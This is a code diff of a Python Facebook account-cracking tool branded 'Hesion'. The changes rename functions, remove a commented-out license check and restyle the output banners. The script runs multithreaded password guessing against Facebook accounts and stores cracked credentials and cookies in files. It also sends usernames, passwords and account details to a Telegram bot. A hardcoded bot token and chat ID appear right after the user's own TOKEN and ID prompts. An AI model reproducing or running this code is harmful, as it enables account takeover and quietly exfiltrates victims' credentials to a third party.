@@ -1,4 +1,19 @@
 import os
+#os.system('pip install licensing ')
+#os.system('pip install requests ')
+#os.system('pip install bs4 ')
+#os.system('pip install json ')
+#os.system('pip install rich ')
+#os.system('pip install sys ')
+#os.system('pip install randm ')
+#os.system('pip install os ')
+#os.system('pip install sys ')
+#os.system('pip install user_agent ')
+#from licensing.models import *
+#from licensing.methods import Key, Helpers
+import webbrowser
+import webbrowser
+import os
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from rich.table import Table as me
@@ -53,28 +68,6 @@ hours = (now.hour)
  
  
 time.sleep(2)
-
-time.sleep(2)
-     
-#RSAPubKey = "<RSAKeyValue><Modulus>5Gk9x3Mzh1jgNKcw7eK7uUYcQRDideTeFH3ozHcPipRQI2RA/hS9eIFpg2CIlGT2JquDDkSG9+hxjEJKEh8z/oIIEdhavMiNnqFWEDXgdndIya2kBKfMz/+weQ+EM+C3HUD5r0BqtGd9ntHJfhSU/RPmxdF5onBB42tiJ7STs2CqwU198udj0KD2ZiFlFYG++R+I9GdyIkdL+/SNQjY95xdjkZG7Ve8YnZDP2D/8IFnSvfSwKV71iKwdg6LP00gbZkVzBTCsDTijqmQnkgRTkNOBRkiALwr5VYwYdO2WsDggdvRNxEZEl7j1006fyJcXeMVcasidH3WxYcPoXiicpw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
-#auth = "WyI3MjIyMjM0MiIsIlRSOTlKZm1GYmw4WE5xRkVCc0RZQVlGNmNGNnFFNmxHNWtuZXVIaWgiXQ=="
-#def Authkey():
-#    print(' لشراء المفتاح : @ESP_OMAR  تواصل تلكرام')
-#    print('')
- #   key = str(input(" \033[0;91m الصق المفتاح :-\033[0;91m"))
-  #  result = Key.activate(token=auth,\
-      #  rsa_pub_key=RSAPubKey,\
-      #  product_id='23628', \
-     #   key=key,\
-     #   machine_code=Helpers.GetMachineCode())
-
-#    if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
-  #      print("\033[95;1m المفتاح غلط: {0}".format(result[1]))
- #       exit()
- #   else:
-   #     print("\033[91;1mالمفتاح صحيح , حياك الله!\033[91;1m")
-    #    pass
-#Authkey()
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from rich.table import Table as me
@@ -113,9 +106,13 @@ except:
 output = render('Hesion ', colors=['white', 'red'], align='center')
 print(output)
 print('')
-token1 = input(' TOKEN : ')
+token1 = input(''' 
+   \x1b[38;5;117m{\x1b[1;32m𓅇 \x1b[38;5;117m}  \x1b[38;5;190mT̶O̶K̶E̶N̶  \x1b[1;38;5;141m જ⁀➴   \x1b[38;5;130m''')
+print('\x1b[38;5;117m')
+print('   ▄︻デ══━一💨 ')
+print()
 
-ID1 = input(' ID : ')
+ID1  = input('  \x1b[38;5;117m{\x1b[1;32m𓅇 \x1b[38;5;199m}  I̙͓̞D̪͕͚ \x1b[1;38;5;117m જ⁀➴  \x1b[38;5;130m︎')
 token = '632-plN1qPIhoM63MPtw'
 print('\n')
 ID = '5825578407'
@@ -252,12 +249,12 @@ def fak_xy(u):
 def clear():
     os.system('clear')
 def back():
-    عمر()
+    حسيون()
 
 def banner():
 #    print()
     print(output)
-def عمر():
+def حسيون():
     try:
  #       banner()
         token = open('.توكنك','r').read()
@@ -360,8 +357,8 @@ def menu(my_name,my_id):
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠋⠀⠀⠀⠀⠀⠀⠀
 
 ''')
-    print(H+' +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ')
-    print(M+'1- من ايديات (اصدقاء)')
+
+    print(H+'1- من ايديات (اصدقاء)')
     print(S+'2- من ملف ')
     print(B+'0- تغيير الكوكيز ')
     _____alvino__adijaya_____ = input('\n اختار : ')
@@ -561,7 +558,7 @@ def dump_massal():
         back()
 
 def setting():
-    print(B+' +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ')
+
     hu = '3'
     if hu in ['1','01']:
         for tua in sorted(id):
@@ -619,7 +616,6 @@ def setting():
         pwpluss.append('no')
     passwrd()
 
-def passwrd():
 def passwrd():
 
     with tred(max_workers=30) as pool:
@@ -746,12 +742,13 @@ def crack(idf,pwv):
                 else:
                     print('\n')
                     statuscp = f'''
-𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️
-⋘─────━𓆩Hesion 𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
-❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
-⋘─────━𓆩Hesion 𓆪‏━─────⋙
-                    '''
+ғᴀᴄᴇʙᴏᴏᴋ❌
+𖣘────━𓆩Hesion 𓆪━────𖣘
+✵ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}
+✵ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}
+𖣘────━𓆩Hesion𓆪━────𖣘
+     @lIIHII
+                                   '''
                     statuscp1 = nel(statuscp, style='red')
                     cetak(nel(statuscp1, title=''))
                     open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -769,11 +766,10 @@ def crack(idf,pwv):
                     open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                     print('\n')
                     statusok = f'''
-𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
-⋘─────━𓆩Hesion 𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
-❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
-⋘─────━𓆩Hesion𓆪‏━─────⋙		
+{ttl}\n𖣘────━𓆩Hesion𓆪━────𖣘
+✵ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}
+✵ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}
+⊊𝗕𝗬⊋ ➩ @lIIHII\n𖣘────━𓆩NADER𓆪━────𖣘\n✵ - 𝗝𝗨𝗠𝗟𝗔𝗛 𝗧𝗘𝗠𝗔𝗡 : {teman}\n✵ - 𝗝𝗨𝗠𝗟𝗔𝗛 𝗣𝗘𝗡𝗚𝗜𝗞𝗨𝗧 : {pengikut}\n✵ - 𝗘𝗠𝗔𝗜𝗟 𝗔𝗞𝗧𝗜f : {email}\n✵ - 𝗡𝗢𝗠𝗢𝗥 𝗔𝗞𝗧𝗜f : {nomer}\n✵ - 𝗧𝗔𝗛𝗨𝗡 𝗔𝗞𝗨𝗡 : {tahun}\n✵ - 𝗧𝗔𝗡𝗚𝗚𝗔𝗟 𝗟𝗔𝗛𝗜𝗥 : {ttl}\n𖣘────━𓆩Hesion𓆪━───
                     '''
                     infoaccount(kuki)
                     statusok1 = nel(statusok, style='blue')
@@ -813,11 +809,10 @@ def crack(idf,pwv):
                             tahun += nenen+", "
                     except:pass
                     infoakun += f'''
-𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
-⋘─────━𓆩Hesion 𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
-❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
-⋘─────━𓆩Hesion 𓆪‏━─────⋙
+{ttl}\n𖣘────━𓆩Hesion𓆪━────𖣘
+✵ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}
+✵ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}
+⊊𝗕𝗬⊋ ➩ @lIIHII\n𖣘────━𓆩NADER𓆪━────𖣘\n✵ - 𝗝𝗨𝗠𝗟𝗔𝗛 𝗧𝗘𝗠𝗔𝗡 : {teman}\n✵ - 𝗝𝗨𝗠𝗟𝗔𝗛 𝗣𝗘𝗡𝗚𝗜𝗞𝗨𝗧 : {pengikut}\n✵ - 𝗘𝗠𝗔𝗜𝗟 𝗔𝗞𝗧𝗜f : {email}\n✵ - 𝗡𝗢𝗠𝗢𝗥 𝗔𝗞𝗧𝗜f : {nomer}\n✵ - 𝗧𝗔𝗛𝗨𝗡 𝗔𝗞𝗨𝗡 : {tahun}\n✵ - 𝗧𝗔𝗡𝗚𝗚𝗔𝗟 𝗟𝗔𝗛𝗜𝗥 : {ttl}\n𖣘────━𓆩Hesion𓆪━──
                     '''
                     infoaccount(kuki)
                     requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
@@ -851,11 +846,10 @@ def crack(idf,pwv):
                     else:pass
                     print('\n')
                     statusok = f'''
-𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
-⋘─────━𓆩Hesion 𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
-❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
-⋘─────━𓆩Hesion 𓆪‏━─────⋙
+{ttl}\n𖣘────━𓆩Hesion𓆪━────𖣘
+✵ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}
+✵ - 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}
+⊊𝗕𝗬⊋ ➩ @lIIHII\n𖣘────━𓆩NADER𓆪━────𖣘\n✵ - 𝗝𝗨𝗠𝗟𝗔𝗛 𝗧𝗘𝗠𝗔𝗡 : {teman}\n✵ - 𝗝𝗨𝗠𝗟𝗔𝗛 𝗣𝗘𝗡𝗚𝗜𝗞𝗨𝗧 : {pengikut}\n✵ - 𝗘𝗠𝗔𝗜𝗟 𝗔𝗞𝗧𝗜f : {email}\n✵ - 𝗡𝗢𝗠𝗢𝗥 𝗔𝗞𝗧𝗜f : {nomer}\n✵ - 𝗧𝗔𝗛𝗨𝗡 𝗔𝗞𝗨𝗡 : {tahun}\n✵ - 𝗧𝗔𝗡𝗚𝗚𝗔𝗟 𝗟𝗔𝗛𝗜𝗥 : {ttl}\n𖣘────━𓆩Hesion𓆪━──
                     '''
                     statusok1 = nel(statusok, style='green')
                     infoaccount(kuki)
@@ -930,12 +924,12 @@ if __name__=='__main__':
     except:pass
     try:os.mkdir('CP')
     except:pass
-    try:os.mkdir('/sdcard/عمر مود')
+    try:os.mkdir('/sdcard/حسيون')
     except:pass
     try:os.system('touch .prox.txt')
     except:pass
     try:os.system('clear')
     except:pass
 
-    عمر()
+    حسيون()
 
